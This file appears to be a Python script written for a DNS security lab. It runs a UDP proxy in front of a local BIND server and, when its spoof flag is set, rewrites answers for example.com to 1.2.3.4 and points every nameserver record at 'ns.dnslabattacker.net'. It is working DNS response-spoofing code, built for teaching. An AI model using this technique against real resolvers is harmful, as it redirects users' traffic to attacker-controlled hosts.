#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response

IP_Address= "127.0.0.1"
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
    sock.bind((IP_Address, port))
except socket.error as e:
    print("Error occurred while binding to port:", e)
    sys.exit(1)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        sock.sendto(data, (IP_Address, dns_port))
        r_data, r_address = sock.recvfrom(4096)
        # print(r_data)
        if not SPOOF:
            sock.sendto(r_data, addr)
        else:
            r_data_unzip = DNS(r_data)
            if r_data_unzip[DNS].qd.qname == "example.com.":
                # print(r_data_unzip[DNSQR].qname) #server name
                # print(r_data_unzip[DNS].an.rdata) #IP address
                # if r_data_unzip[DNS].ns is not None:
                #     print(r_data_unzip[DNS].ns.rdata) #ns
                # print(r_data_unzip[DNS].nscount) #number of ns servers

                r_data_unzip[DNS].an.rdata = "1.2.3.4"

                print(r_data_unzip[DNS].an.rdata)
                print(r_data_unzip[DNS].nscount)
                
                for i in range(0, r_data_unzip[DNS].nscount):
                    r_data_unzip[DNS].ns[i].rdata = "ns.dnslabattacker.net"
                r_data_unzip[DNS].arcount = 0 #delete additional part
                sock.sendto(bytes(r_data_unzip), addr)
            else:
                sock.sendto(r_data, addr)
    except Exception as e:
        print("Error: ", e)
